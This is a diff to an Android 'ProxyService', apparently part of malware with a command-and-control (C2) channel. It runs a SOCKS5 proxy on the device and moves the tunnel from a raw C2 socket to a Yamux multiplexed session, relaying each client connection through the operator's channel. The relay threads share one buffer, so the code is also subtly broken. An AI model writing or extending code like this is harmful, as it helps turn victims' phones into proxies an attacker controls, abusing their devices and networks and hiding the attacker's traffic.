@@ -10,15 +10,16 @@ import java.net.*;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
+import com.github.hashicorp.yamux.Session;
+import com.github.hashicorp.yamux.Stream;
+
 public class ProxyService extends Service {
     private static final String TAG = "ProxyService";
     private static final int PROXY_PORT = 1080;
     private ServerSocket serverSocket;
     private ExecutorService executor;
     private volatile boolean running = false;
-    private Socket c2Socket;
-    private PrintWriter c2Writer;
-    private BufferedReader c2Reader;
+    private Session yamuxSession;
 
     @Override
     public void onCreate() {
@@ -27,14 +28,9 @@ public class ProxyService extends Service {
         Log.d(TAG, "ProxyService created");
     }
 
-    public void setC2Socket(Socket socket) {
-        this.c2Socket = socket;
-        try {
-            c2Writer = new PrintWriter(socket.getOutputStream(), true);
-            c2Reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to set C2 socket: " + e.getMessage());
-        }
+    public void setYamuxSession(Session session) {
+        this.yamuxSession = session;
+        Log.d(TAG, "Yamux session set");
     }
 
     public void startProxy() {
@@ -124,14 +120,22 @@ public class ProxyService extends Service {
                 return;
             }
 
-            Log.d(TAG, "Proxy: " + host + ":" + port);
+            Log.d(TAG, "SOCKS5: " + host + ":" + port);
 
-            // Send PROXY command through C2 socket
-            c2Writer.println("PROXY " + host + " " + port);
+            // Open a new Yamux stream
+            Stream stream = yamuxSession.openStream();
+            OutputStream proxyOut = stream.getOutputStream();
+            InputStream proxyIn = stream.getInputStream();
+
+            // Send PROXY command through the stream
+            proxyOut.write(("PROXY " + host + " " + port + "\n").getBytes());
+            proxyOut.flush();
 
             // Wait for CONNECTED response
-            String response = c2Reader.readLine();
+            BufferedReader reader = new BufferedReader(new InputStreamReader(proxyIn));
+            String response = reader.readLine();
             if (response == null || !response.equals("CONNECTED")) {
+                stream.close();
                 client.close();
                 return;
             }
@@ -145,41 +149,38 @@ public class ProxyService extends Service {
             out.write(success);
             out.flush();
 
-            // Relay data
-            relayData(client);
+            // Relay data between client and stream
+            relayData(client, proxyIn, proxyOut);
 
         } catch (Exception e) {
             Log.e(TAG, "Proxy error: " + e.getMessage());
         }
     }
 
-    private void relayData(Socket client) {
+    private void relayData(Socket client, InputStream proxyIn, OutputStream proxyOut) {
         try {
             InputStream clientIn = client.getInputStream();
             OutputStream clientOut = client.getOutputStream();
-            InputStream c2In = c2Socket.getInputStream();
-            OutputStream c2Out = c2Socket.getOutputStream();
-
             byte[] buffer = new byte[8192];
             boolean[] closed = {false};
 
-            // Client -> C2
+            // Client -> Proxy
             Thread t1 = new Thread(() -> {
                 try {
                     int len;
                     while ((len = clientIn.read(buffer)) != -1) {
-                        c2Out.write(buffer, 0, len);
-                        c2Out.flush();
+                        proxyOut.write(buffer, 0, len);
+                        proxyOut.flush();
                     }
                 } catch (Exception e) {}
                 closed[0] = true;
             });
 
-            // C2 -> Client
+            // Proxy -> Client
             Thread t2 = new Thread(() -> {
                 try {
                     int len;
-                    while ((len = c2In.read(buffer)) != -1) {
+                    while ((len = proxyIn.read(buffer)) != -1) {
                         clientOut.write(buffer, 0, len);
                         clientOut.flush();
                     }
